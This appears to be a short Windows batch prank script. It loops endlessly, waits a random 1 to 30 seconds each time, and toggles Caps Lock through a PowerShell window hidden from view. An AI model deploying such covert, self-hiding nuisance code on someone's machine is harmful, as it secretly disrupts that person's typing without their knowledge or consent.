@echo off
:s
SET /A rnd=%RANDOM% * 30 / 32768 + 1
echo %rnd%
>nul ping -n %rnd% localhost
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}')"
goto s


